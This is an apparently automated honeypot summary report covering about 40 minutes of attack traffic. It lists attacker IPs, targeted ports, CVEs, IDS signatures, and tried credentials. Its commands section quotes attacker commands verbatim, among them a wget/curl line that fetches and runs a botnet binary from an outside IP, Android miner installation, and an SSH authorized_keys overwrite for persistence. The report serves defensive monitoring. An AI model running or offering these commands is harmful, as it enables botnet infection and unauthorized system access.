
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-26T04:01:23Z
**Timeframe of Report:** 2025-10-26T03:20:00Z to 2025-10-26T04:00:00Z
**Files Used to Generate Report:**
- agg_log_20251026T032001Z.json
- agg_log_20251026T034001Z.json
- agg_log_20251026T040001Z.json

## Executive Summary
This report summarizes 15,950 events collected from the honeypot network. The majority of the attacks were detected by Suricata, Honeytrap, and Cowrie honeypots. The most prominent attacker IP was 109.205.211.9. A variety of CVEs were observed, with a focus on older vulnerabilities. Attackers attempted numerous commands, primarily related to system enumeration, remote access, and malware installation.

## Detailed Analysis

### Attacks by Honeypot
- **Suricata:** 5752
- **Honeytrap:** 4948
- **Cowrie:** 2870
- **Ciscoasa:** 1744
- **Sentrypeer:** 203
- **Dionaea:** 93
- **Mailoney:** 114
- **Adbhoney:** 55
- **Tanner:** 59
- **Redishoneypot:** 44
- **H0neytr4p:** 34
- **Honeyaml:** 8
- **ConPot:** 11
- **Ipphoney:** 3
- **Wordpot:** 1
- **Heralding:** 3
- **Medpot:** 2
- **ssh-rsa:** 2
- **Dicompot:** 3
- **ElasticPot:** 1

### Top Attacking IPs
- **109.205.211.9:** 4465
- **80.94.95.238:** 1609
- **178.62.254.40:** 585
- **171.231.193.8:** 435
- **116.110.215.85:** 406
- **107.170.36.5:** 244
- **118.26.39.178:** 218
- **64.23.189.160:** 172
- **190.119.63.98:** 129
- **222.107.156.227:** 159
- **167.250.224.25:** 151
- **77.83.207.203:** 113
- **68.183.149.135:** 106
- **198.23.238.154:** 96
- **68.183.207.213:** 94
- **185.243.5.121:** 67
- **130.83.245.115:** 66
- **124.198.131.83:** 65
- **45.153.34.156:** 37
- **196.251.69.107:** 35

### Top Targeted Ports/Protocols
- **22:** 460
- **5060:** 203
- **8333:** 156
- **5903:** 129
- **25:** 114
- **5901:** 119
- **445:** 46
- **6379:** 44
- **80:** 64
- **5905:** 80
- **5904:** 72
- **TCP/22:** 61
- **TCP/80:** 43
- **TCP/7001:** 47
- **TCP/8080:** 36
- **5908:** 53
- **5907:** 50
- **5909:** 49
- **23:** 87
- **443:** 34

### Most Common CVEs
- CVE-2002-0013 CVE-2002-0012
- CVE-2019-11500 CVE-2019-11500
- CVE-2017-3506 CVE-2017-3506 CVE-2017-3606
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2021-35394 CVE-2021-35394
- CVE-2019-12263 CVE-2019-12261 CVE-2019-12260 CVE-2019-12255
- CVE-2006-2369
- CVE-2019-16920 CVE-2019-16920
- CVE-2021-35395 CVE-2021-35395
- CVE-2016-20017 CVE-2016-20017
- CVE-2024-12856 CVE-2024-12856 CVE-2024-12885
- CVE-2014-6271
- CVE-2023-52163 CVE-2023-52163
- CVE-2023-47565 CVE-2023-47565
- CVE-2023-31983 CVE-2023-31983
- CVE-2024-10914 CVE-2024-10914
- CVE-2009-2765
- CVE-2015-2051 CVE-2019-10891 CVE-2024-33112 CVE-2025-11488 CVE-2025-11488 CVE-2024-33112 CVE-2022-37056 CVE-2019-10891 CVE-2015-2051
- CVE-2024-3721 CVE-2024-3721
- CVE-2006-3602 CVE-2006-4458 CVE-2006-4542
- CVE-2021-42013 CVE-2021-42013

### Commands Attempted by Attackers
- pm path com.ufo.miner
- pm install /data/local/tmp/ufo.apk
- rm -f /data/local/tmp/ufo.apk
- am start -n com.ufo.miner/com.example.test.MainActivity
- ps | grep trinity
- rm -rf /data/local/tmp/*
- cat /proc/uptime 2 > /dev/null | cut -d. -f1
- chmod 0755 /data/local/tmp/nohup
- chmod 0755 /data/local/tmp/trinity
- /data/local/tmp/nohup su -c /data/local/tmp/trinity
- /data/local/tmp/nohup /data/local/tmp/trinity
- uname -s -v -n -m 2 > /dev/null
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; curl http://94.154.35.154/arm.urbotnetisass -O; chmod +x arm.urbotnetisass; ./arm.urbotnetisass android;
- netstat -tulpn | head -10
- ./oinasf; dd if=/proc/self/exe bs=22 count=1 || while read i; do echo $i; done < /proc/self/exe || cat /proc/self/exe;
- ./oinasf
- Accept-Encoding: gzip
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa ...\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password:
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'

### Signatures Triggered
- **ET SCAN MS Terminal Server Traffic on Non-standard Port:** 3099
- **ET HUNTING RDP Authentication Bypass Attempt:** 1161
- **ET DROP Dshield Block Listed Source group 1:** 449
- **ET SCAN NMAP -sS window 1024:** 176
- **ET INFO Reserved Internal IP Traffic:** 59
- **ET CINS Active Threat Intelligence Poor Reputation IP group 44:** 30
- **ET CINS Active Threat Intelligence Poor Reputation IP group 48:** 35
- **ET CINS Active Threat Intelligence Poor Reputation IP group 49:** 13
- **ET DROP Spamhaus DROP Listed Traffic Inbound group 28:** 12
- **ET CINS Active Threat Intelligence Poor Reputation IP group 45:** 10
- **ET CINS Active Threat Intelligence Poor Reputation IP group 46:** 13
- **ET CINS Active Threat Intelligence Poor Reputation IP group 51:** 11
- **ET CINS Active Threat Intelligence Poor Reputation IP group 52:** 11
- **ET SCAN Potential SSH Scan:** 20
- **ET CINS Active Threat Intelligence Poor Reputation IP group 50:** 18
- **ET CINS Active Threat Intelligence Poor Reputation IP group 47:** 12
- **ET WEB_SERVER WebShell Generic - wget http - POST:** 11

### Users / Login Attempts
- root/Fs3Pv0mBi0X5l
- root/fruzgW
- telecomadmin/admintelecom
- root/FSec
- root/Fu7ur321
- root/fuckoff2013
- 345gs5662d34/345gs5662d34
- user/ROOT@123lpsdx
- root/Fv112498
- root/G!
- py/py
- admin/1qa2ws3ed4rf
- bioinfo/bioinfo
- sherry/sherry

### Files Uploaded/Downloaded
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- string>
- rondo.xcw.sh
- loader.sh
- rondo.dgx.sh
- server.cgi
- system.html
- rondo.tkg.sh
- rondo.qre.sh
- cfg_system_time.htm
- login_pic.asp
- apply.cgi
- rondo.sbx.sh

### HTTP User-Agents
- Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36

### SSH Clients
- *No SSH client information was recorded.*

### SSH Servers
- *No SSH server information was recorded.*

### Top Attacker AS Organizations
- *No attacker AS organization information was recorded.*

## Key Observations and Anomalies
- A significant amount of activity originates from the IP address 109.205.211.9, suggesting a targeted or persistent attacker.
- The commands executed indicate a focus on establishing persistent access (via SSH keys), cryptocurrency mining, and deploying botnet clients.
- The CVEs targeted are a mix of old and recent vulnerabilities, indicating that attackers are using a broad set of exploits to maximize their chances of success.
- The presence of commands to download and execute `rondo.*.sh` scripts suggests a coordinated campaign.
- A large number of RDP-related signatures were triggered, indicating a high volume of scanning and brute-force attempts against this protocol.
